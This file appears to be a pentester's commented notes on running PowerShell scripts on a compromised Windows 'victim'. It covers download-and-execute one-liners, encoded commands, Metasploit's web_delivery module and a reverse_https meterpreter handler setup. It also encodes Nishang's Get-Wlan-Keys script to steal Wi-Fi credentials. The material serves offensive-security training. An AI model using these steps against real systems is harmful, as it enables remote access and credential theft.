#Manually Executing Scripts and Modules
# -Upload a script
# -Use download and execute one liner
# -Use -encodedcommand parameter of PowerShell 

#Using modules to execute Powershell Script
# post/windows/manage/powershell/exec_powershell
# exploit/multi/script/web_delivery


#new meterpreter session
#upload Get-Information.ps1 to the victim
# use exploit/multi/handler 
# set payload windows/x64/meterpreter/reverse_https
# set lhost 192.168.1.42
# set l port 4444
# run


#because it will load the script to memory we must call the function inside the Get-WlanKeys script
#Invoke-encode -dataToEncode nishang/Gather/Get-Wlan-Keys.ps1 -OutCommand
# notepad.exe encoded.txt
